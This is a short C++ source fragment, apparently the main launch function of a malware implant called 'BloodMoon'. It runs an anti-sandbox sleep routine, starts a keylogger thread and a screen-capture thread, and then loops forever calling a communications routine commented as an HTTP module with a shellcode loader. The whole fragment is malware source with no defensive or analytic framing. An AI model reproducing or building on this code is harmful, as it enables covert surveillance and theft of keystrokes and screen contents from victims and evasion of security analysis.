
DWORD LaunchBloodMoon() {

	Evasion evade;
	
	// Custom sleep routine before initial execution
	evade.m_Loops = 0x10;
	evade.m_SleepIncrement = 0x263;
	evade.AntiSandbox();

	// Init Keylogger
	DWORD klTid;
	::CreateThread(NULL, 0, StartKeylogger, NULL, 0, &klTid);

	// Init ScreenCapture
	DWORD scTid;
	::CreateThread(NULL, 0, StartScreenCapture, NULL, 0, &scTid);

	while (true) {
		// HTTP module w/ shellcode loader
		start_comms();

	}

}
